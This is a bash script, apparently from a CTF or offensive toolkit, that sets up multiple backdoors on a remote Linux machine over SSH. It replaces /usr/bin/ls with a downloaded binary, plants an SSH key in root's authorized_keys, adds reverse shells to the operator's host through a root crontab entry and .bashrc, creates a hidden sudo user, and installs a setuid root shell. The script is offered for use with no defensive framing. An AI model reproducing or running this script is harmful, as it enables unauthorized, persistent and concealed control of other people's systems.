#!/bin/bash



echo -e "\e[31mVVVVVVVV           VVVVVVVV 333333333333333   XXXXXXX       XXXXXXX      \e[0m"
echo -e "\e[31mV::::::V           V::::::V3:::::::::::::::33 X:::::X       X:::::X      \e[0m"
echo -e "\e[31mV::::::V           V::::::V3::::::33333::::::3X:::::X       X:::::X      \e[0m"
echo -e "\e[31mV::::::V           V::::::V3333333     3:::::3X::::::X     X::::::X      \e[0m"
echo -e "\e[31m V:::::V           V:::::V             3:::::3XXX:::::X   X:::::XXX      \e[0m"
echo -e "\e[31m  V:::::V         V:::::V              3:::::3   X:::::X X:::::X         \e[0m"
echo -e "\e[31m   V:::::V       V:::::V       33333333:::::3     X:::::X:::::X          \e[0m"
echo -e "\e[31m    V:::::V     V:::::V        3:::::::::::3       X:::::::::X           \e[0m"
echo -e "\e[31m     V:::::V   V:::::V         33333333:::::3      X:::::::::X         github:https://github.com/V3X-777     \e[0m"
echo -e "\e[31m      V:::::V V:::::V                  3:::::3    X:::::X:::::X          discord:s3cdet17\e[0m"
echo -e "\e[31m       V:::::V:::::V                   3:::::3   X:::::X X:::::X         \e[0m"
echo -e "\e[31m        V:::::::::V                    3:::::3XXX:::::X   X:::::XXX      \e[0m"
echo -e "\e[31m         V:::::::V         3333333     3:::::3X::::::X     X::::::X      \e[0m"
echo -e "\e[31m          V:::::V          3::::::33333::::::3X:::::X       X:::::X      \e[0m"
echo -e "\e[31m           V:::V           3:::::::::::::::33 X:::::X       X:::::X      \e[0m"
echo -e "\e[31m            VVV             333333333333333   XXXXXXX       XXXXXXX      \e[0m"


echo -e "\e[31mBackdoor Setup Script\e[0m"
echo -e "\e[31m---------------------\e[0m"
echo -e "\e[31mThis script is created by V3X to create multi-backdoors on a remote machine.\e[0m"
echo -e "\e[31mPlease provide the following information:\e[0m"


usage() {
    echo "Usage: $0 -u <machine_username> -p <password> -U <your_username> -i <target_ip> -I <ip_user> -P <port> -k <public_key>"
    echo "Options:"
    echo "  -u <target_username>      : Remote machine username"
    echo "  -P <password>              : Password for remote machine"
    echo "  -U <your_username>         : Your username"
    echo "  -I <your_ip>               : Your IP address"
    echo "  -i <ip_target>               : IP target"
    echo "  -p <port>                  : Port number"
    echo "  -k <public_key>            : Path to SSH public key file"
    exit 1
}

while getopts ":u:p:U:i:I:P:k:" opt; do
    case $opt in
        u) user="$OPTARG";;
        p) PASS="$OPTARG";;
        U) USER="$OPTARG";;
        i) IP="$OPTARG";;
        I) ipuser="$OPTARG";;
        P) port="$OPTARG";;
        k) PUBLIC_KEY="$OPTARG";;
        \?) echo "Invalid option: -$OPTARG" >&2; usage;;
        :) echo "Option -$OPTARG requires an argument." >&2; usage;;
    esac
done

if [ -z "$user" ] || [ -z "$PASS" ] || [ -z "$USER" ] || [ -z "$IP" ] || [ -z "$ipuser" ] || [ -z "$port" ] || [ -z "$PUBLIC_KEY" ]; then
    echo "Missing required arguments."
    usage
fi


export ipuser
export port


vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no "$user"@"$IP" << EOF

sleep 3

sudo rm /usr/bin/ls

wget "http://"$vpn":8000/"$PUBLIC_KEY"" -O "/tmp/"$PUBLIC_KEY""

sleep 3

wget http://"$vpn":8000/ls -O "/usr/bin/ls"

sleep 3

sudo chmod +x /usr/bin/ls

cat "/tmp/"$PUBLIC_KEY"" >> "root/.ssh/authorized_keys"

echo "* * * * * root /bin/sh -c \"/bin/bash -i >& /dev/tcp/"$ipuser"/"$port" 0>&1\"" | sudo tee -a /etc/crontab

echo '/bin/sh -i >& /dev/tcp/"$ipuser"/"$port" 0>&1' >> ~/.bashrc

sudo adduser --disabled-password --gecos "" "$USER"

echo ""$USER":"$PASS"" | sudo chpasswd

sudo usermod -aG sudo "$USER"

echo ""$USER" ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers


touch vshell.c
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > vshell.c
gcc -o vshell vshell.c
rm vshell.c
chown root:root vshell
chmod u+s vshell
sudo mv vshell /usr/bin/

echo -e "\e[32m--------------------------------------------THANK-YOU-FOR-USING-V3X-SCRIPT-----------------------------------------------\e[0m"
